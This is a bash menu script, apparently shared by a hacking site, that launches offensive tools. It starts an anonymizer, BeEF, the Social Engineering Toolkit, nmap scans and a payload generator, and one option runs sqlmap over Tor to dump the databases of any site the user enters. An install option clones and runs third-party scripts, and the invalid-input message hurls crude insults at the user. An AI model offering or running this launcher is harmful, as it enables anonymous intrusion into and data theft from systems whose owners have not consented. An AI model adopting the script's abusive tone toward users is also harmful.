#!/bin/bash

#Lazy shits bash script made by NiFe - hackingarise.com

#start

clear     
echo "The hackingarise team will take no responsibility for any missuse of this tool." 

sleep 3




clear 


figlet Lazy Shits V 1 . 0
echo ""
echo "Made By NiFe --- hackingarise.com"
echo ""


#menu

echo ""
echo "[1] Start 4nonimizer                [10] Payload Generator"
echo "[2] Stop 4nonimizer"
echo "[3] Start 4nonimizer Browser"
echo "[4] Start beef-xss"
echo "[5] IP-Pinger"
echo "[6] Nmap Port Scanner"
echo "[7] Social Engineering Toolkit"
echo "[8] Youtube-DL"
echo "[9] Automated Basic SQL Injection"
echo "[98] Install"
echo "[99] Exit"
echo ""
echo ""
read -p "LazyShits> " OPTION

#menu options

if [[ $OPTION == 1 ]]; then
command 4nonimizer start

elif [[ $OPTION == 2 ]]; then
command 4nonimizer stop

elif [[ $OPTION == 3 ]]; then
clear
command 4nonimizer browser

elif [[ $OPTION == 4 ]]; then
clear
command beef-xss

elif [[ $OPTION == 5 ]]; then
clear
read -p "Enter IP Address> " IPADDY
ping $IPADDY 

elif [[ $OPTION == 6 ]]; then
clear
read -p "Enter IP To Scan> " IPADDRE 
command nmap -sV -Pn $IPADDRE

elif [[ $OPTION == 7 ]]; then
clear
command setoolkit

elif [[ $OPTION == 8 ]]; then
clear
read -p "Enter Youtube Vid URL> " YTURL
youtube-dl --extract-audio --audio-format mp3 $YTURL 

elif [[ $OPTION == 9 ]]; then
clear
read -p "Enter Vuln Site> " VULNSITE
      command sqlmap -u $VULNSITE --tor --time-sec 3 --dbs --dump --random-agent

elif [[ $OPTION == 10 ]]; then
     clear
    command cd sploitgen
    command chmod 755 sploitgen.sh
    command ./sploitgen.sh


elif [[ $OPTION == 98 ]]; then
command git clone https://github.com/Hackplayers/4nonimizer
command cd 4nonimizer
command ./4nonimizer install
command cd ..
command sudo apt-get install youtube-dl
command sudo apt-get install setoolkit
command sudo apt-get install beef-xss
command sudo apt-get install nmap
command sudo apt-get install sqlmap
command git clone https://github.com/Hackingriseofficial/sploitgen
clear
echo "Everything is now installed, please reload the script."
sleep 2
 
elif [[ $OPTION == 99 ]]; then
clear
echo "Why are you leaving? Was it something I said?... Please come back... :("
sleep 3 

else 
clear
echo "What the fuck are ye trying to do ya stupid cunt
You have the fucking menu there with all the commands and 
You type this shit? Fuck you man I'm exiting
You fucking cucumber the menu was right there..."
sleep 3




fi
